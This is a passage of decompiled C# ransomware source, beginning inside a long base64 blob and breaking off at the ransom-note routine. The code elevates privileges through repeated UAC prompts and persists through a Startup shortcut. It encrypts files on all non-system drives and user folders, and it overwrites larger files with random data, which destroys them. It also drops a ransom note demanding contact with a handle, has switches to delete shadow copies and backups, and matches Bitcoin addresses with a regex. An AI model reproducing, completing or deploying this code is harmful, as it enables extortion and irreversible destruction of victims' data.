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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[9] { "Attention! All your files are encrypted!", "To restore your files and access them,", "send an SMS with the text C32d4 to the User @keygroup777huis1", "", "You have 1 attempts to enter the code. If this", "amount is exceeded, all data will irreversibly deteriorate. Be", "careful when entering the code!", "", "Glory @huis_bn" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".lnk", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>r14TXP/vuVjpcYS0jO3S1Ypdn4mEOPTzgyGmQQ+y5loxb/1LNADKAh4YTkpBRgnN11sYNmaWhbJWLyh5VQXSGZfzbQpfeiaCZobavN6a3yRZqydiXfKP66vMwPx+CRToVctug3RYc1MgdMs6kEPzJqZpSFR0j5csviAqzkQZLh0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
